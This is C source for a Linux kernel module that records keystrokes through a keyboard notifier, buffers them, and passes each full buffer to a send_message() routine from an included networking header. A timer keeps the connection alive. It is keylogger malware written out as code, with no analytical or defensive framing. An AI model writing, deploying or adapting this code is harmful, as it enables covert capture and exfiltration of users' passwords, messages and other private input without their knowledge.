#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/delay.h>
#include <linux/mutex.h>

#include "networking.h"
#include "keyboardLogger.h"

// Keyboard stroke buffer
static char keystrokes[KEY_BUFFER_SIZE + 1] = ""; 

// Timer to reinitialize connection
struct timer_list connection_timer;

// Mutex between sock refreshment and other resources.
struct mutex socks_mutex;

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
    static int32_t buffer_count = 0; // Counts how many chars have been logged.
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        uint32_t keycode = param->value;
        char key = (char) keycode; // Convert keycode to char

        keystrokes[buffer_count] = key;
        buffer_count = (buffer_count + 1)%KEY_BUFFER_SIZE;

        printk(KERN_INFO "Buffer: %s\n", keystrokes);
        printk(KERN_INFO "Buffer size: %d\n", buffer_count);

        if (buffer_count == 0) {
            send_message(keystrokes);
            mod_timer(&connection_timer, jiffies + msecs_to_jiffies(1000));
        }
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
static int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}


struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};